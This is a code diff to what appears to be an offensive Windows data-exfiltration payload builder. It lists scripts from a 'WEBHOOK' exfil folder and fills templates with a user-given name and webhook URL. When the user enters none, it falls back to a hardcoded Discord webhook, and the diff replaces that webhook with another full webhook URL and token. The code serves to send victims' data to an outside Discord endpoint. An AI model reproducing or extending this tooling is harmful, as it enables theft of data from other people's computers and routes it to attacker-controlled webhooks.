@@ -3,6 +3,16 @@
 import os
 import json
 from modules.sftp import sftp
+import sys
+
+
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS
+    except Exception:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
+
 
 R = '\033[31m' # red
 G = '\033[32m' # green
@@ -12,7 +22,7 @@ W = '\033[0m'  # white
 def WEBHOOK(win):
 	print('\n', end='')
 	exfil_scripts = []
-	for (dirpath, dirname, filenames) in os.walk('scripts/windows/WEBHOOK'):
+	for (dirpath, dirname, filenames) in os.walk(resource_path('scripts/windows/WEBHOOK')):
 		exfil_scripts.extend(filenames)
 	for item in exfil_scripts:
 		print(G + '[{}] '.format(exfil_scripts.index(item)) + C + item)
@@ -65,7 +75,7 @@ def exfil_output(script_path, chosen):
 	url= input(G + '[+]' + C + ' WEBHOOK URL (ENTER 0 IF YOU DO NAT HAVE ONE): ' + W)
 	nma= input(G + '[+]' + C + ' ENTER A SMALL NAME:  ' + W)
 	if url == '0':
-    		url = "https://discord.com/api/webhooks/789192970455875624/hLqB3_mlZnH27iVzmZ4eFmhWA1Uz2Q26vDHT9u5-GJM4xYQDy-7Q2HkSgP3B6RobUrpO"
+    		url = "https://discord.com/api/webhooks/808760966576865360/ZFC0eGGFX2YKt5_8of26kI1r8MEV5DbWUT5vgGnEO2YKwcqqxuKwDWZPjBMFXywgNxf7"
 
 	filedata = filedata.replace('USERNAME', nma)
 	filedata = filedata.replace('WEBHOOK', url)
